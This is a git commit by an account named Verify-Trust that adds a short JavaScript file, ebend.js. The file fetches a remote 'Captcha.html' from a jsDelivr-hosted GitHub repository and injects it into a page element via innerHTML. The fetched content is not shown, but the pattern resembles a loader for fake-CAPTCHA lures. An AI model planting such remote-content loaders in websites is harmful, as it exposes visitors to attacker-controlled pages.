c547e94468181fcdc2f7e36e1ed7161ebede01d0
Verify-Trust <ops.edcomedge@gmail.com>
2025-04-13 22:29:19 +0200

    Add files via upload

---
+++ ebend.js
@@ -0,0 +1,8 @@
+﻿fetch('https://cdn.jsdelivr.net/gh/Verify-Trust/Edcomedge/Captcha.html')
+  .then(response => response.text())
+  .then(html => {
+    const container = document.getElementById('my-captcha');
+    if (container) {
+      container.innerHTML = html;
+    }
+  });
